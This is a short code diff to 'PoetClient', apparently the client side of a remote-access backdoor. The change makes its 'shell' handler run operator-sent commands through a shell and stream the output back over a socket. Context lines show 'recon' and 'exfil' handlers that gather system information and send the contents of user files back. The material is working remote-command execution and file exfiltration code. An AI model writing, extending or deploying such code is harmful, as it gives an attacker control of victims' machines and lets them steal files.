@@ -124,7 +124,15 @@ class PoetClient(object):
                 elif inp == 'recon':
                     s.send(zlib.compress(self.recon()))
                 elif inp.startswith('shell '):
-                    s.send(self.cmd_exec(inp[6:]).strip())
+                    child_stdout = sp.Popen(inp[6:], stdout=sp.PIPE,
+                                            stderr=sp.STDOUT, shell=True).stdout
+                    while True:
+                        output = child_stdout.readline()
+                        if output:
+                            s.send(output)
+                        else:
+                            break
+                    s.send('shelldone')
                 elif inp.startswith('exfil '):
                     try:
                         with open(os.path.expanduser(inp[6:])) as f:
